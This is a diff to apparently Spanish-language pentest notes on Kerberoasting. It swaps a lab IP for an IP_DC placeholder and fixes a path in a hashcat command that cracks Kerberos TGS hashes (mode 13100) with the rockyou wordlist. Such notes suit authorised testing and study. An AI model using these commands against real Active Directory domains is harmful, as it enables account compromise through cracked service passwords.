@@ -21,9 +21,9 @@ Ataques:
 Paso 1:
 # Sincronizar el reloj con el DC
 ❯ sudo timedatectl set-ntp false
-❯ sudo ntpdate 10.129.46.68
+❯ sudo ntpdate IP_DC
 # o
-❯ sudo chronyd -q 'server 10.129.46.68 iburst'
+❯ sudo chronyd -q 'server IP_DC iburst'
 ```
 
 ```powershell 
@@ -38,7 +38,7 @@ Paso 2:
 ```bash 
 Paso 3:
 # Crackear el hash 
-❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hascat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt  /usr/share/wordlists/rockyou.txt   
+❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt /usr/share/wordlists/rockyou.txt   
 
 	# kerberoasting.tgs = Contiene el TGT del comando anterior 
 ```
